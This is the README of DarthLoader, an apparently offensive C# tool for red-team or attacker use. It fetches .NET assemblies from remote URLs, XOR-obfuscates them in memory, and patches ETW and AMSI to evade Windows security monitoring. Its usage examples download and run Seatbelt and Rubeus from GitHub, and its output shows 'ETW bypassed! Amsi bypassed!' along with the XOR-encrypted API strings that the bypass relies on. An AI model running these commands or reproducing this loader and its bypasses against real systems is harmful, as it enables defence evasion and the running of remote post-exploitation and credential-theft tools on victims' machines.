# DarthLoader
This is a project heavily inspired by Jean-François Maes's [SANS  Workshop Reflection in C#](https://www.sans.org/webcasts/sans-workshop-reflection-in-c-/) to help (c)sharpen my C# dev skills. A lot of code was borrowed and/or extended for this project from:
- https://github.com/cobbr/SharpSploit/tree/master/SharpSploit/Evasion
- https://jfmaes-1.gitbook.io/reflection-workshop/
- StackOverflow

DarthLoader will do the following:
- Remotely fetch a .Net assembly from the web using a base64 encoded url and Xor the byte array in memory.
- Fetch a local .Net assembly into memory.
- Bypass ETW and AMSI by decrypting function strings at runtime via xor key being passed as cmdline arg.
- Decrypt and run the assembly from memory.

### Usage
```
PS C:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release> .\DarthLoader.exe

 _______                     __     __       __                              __
|       \                   |  \   |  \     |  \                            |  \
| $$$$$$$\ ______   ______ _| $$_  | $$____ | $$      ______   ______   ____| $$ ______   ______
| $$  | $$|      \ /      |   $$ \ | $$    \| $$     /      \ |      \ /      $$/      \ /      \
| $$  | $$ \$$$$$$|  $$$$$$\$$$$$$ | $$$$$$$| $$    |  $$$$$$\ \$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$\
| $$  | $$/      $| $$   \$$| $$ __| $$  | $| $$    | $$  | $$/      $| $$  | $| $$    $| $$   \$$
| $$__/ $|  $$$$$$| $$      | $$|  | $$  | $| $$____| $$__/ $|  $$$$$$| $$__| $| $$$$$$$| $$
| $$    $$\$$    $| $$       \$$  $| $$  | $| $$     \$$    $$\$$    $$\$$    $$\$$     | $$
 \$$$$$$$  \$$$$$$$\$$        \$$$$ \$$   \$$\$$$$$$$$\$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$$\$$


==================== USAGE: ====================

--FunctionsXorKey      : Xor key to decrypt function strings from DarthLoaderHelper.exe
--FilePath             : a local file path or URL to load a .Net asseembly from
--Args                 : Xor key to decrypt function strings from DarthLoaderHelper.exe
--XorKey               : Xor key used to encrypt/decrypt .Net assembly from URL

==================== EXAMPLES: ====================
DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Seatbelt.exe --Args AntiVirus --XorKey test

DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Rubeus.exe --XorKey test

DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\d4ddyd4rth\Desktop\Hello.exe

DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\d4ddyd4rth\Desktop\Hello.exe --Args test
```
### Example
```
PS D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release> .\DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Seatbelt.exe --Args AntiVirus --XorKey test

[!] ETW bypassed!
[!] Amsi bypassed!
 _______                     __     __       __                              __
|       \                   |  \   |  \     |  \                            |  \
| $$$$$$$\ ______   ______ _| $$_  | $$____ | $$      ______   ______   ____| $$ ______   ______
| $$  | $$|      \ /      |   $$ \ | $$    \| $$     /      \ |      \ /      $$/      \ /      \
| $$  | $$ \$$$$$$|  $$$$$$\$$$$$$ | $$$$$$$| $$    |  $$$$$$\ \$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$\
| $$  | $$/      $| $$   \$$| $$ __| $$  | $| $$    | $$  | $$/      $| $$  | $| $$    $| $$   \$$
| $$__/ $|  $$$$$$| $$      | $$|  | $$  | $| $$____| $$__/ $|  $$$$$$| $$__| $| $$$$$$$| $$
| $$    $$\$$    $| $$       \$$  $| $$  | $| $$     \$$    $$\$$    $$\$$    $$\$$     | $$
 \$$$$$$$  \$$$$$$$\$$        \$$$$ \$$   \$$\$$$$$$$$\$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$$\$$


[*] Downloading and encrypting assembly with the key: test
[+] Encrypted assembly loaded into memory...
[+] Hit any key to run...


                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.1.0         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== AntiVirus ======

  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe



[*] Completed collection in 0.12 seconds

<-----SNIP----->
```

## DarthLoaderHelper
This project was made to help Xor encrypt the strings needed for passing into function calls to patch ETW/AMSI in Helpers.cs.  
```
D:\SecToolDev\DarthLoaderHelper.exe testing123

[+] Encrypting with key: testing123
[+] Encrypted string 'etwbypass': 11110416101E064241
[+] Encrypted string 'amsibypass': 1508001D0B1717504140
[+] Encrypted string 'ntdll.dll': 1A1117180540035D5E
[+] Encrypted string 'EtwEventWrite': 311104311F0B094565411D1116
[+] Encrypted string 'amsi.dll': 1508001D470A0B5D
[+] Encrypted string 'AmsiScanBuffer': 3508001D3A0D065F704612031606
```

## To-do
- [X] Help menu
- [X] Paramerize URL 
- [X] Add local file assembly loading and parameterize file path 
- [X] Paramerize assembly parameters
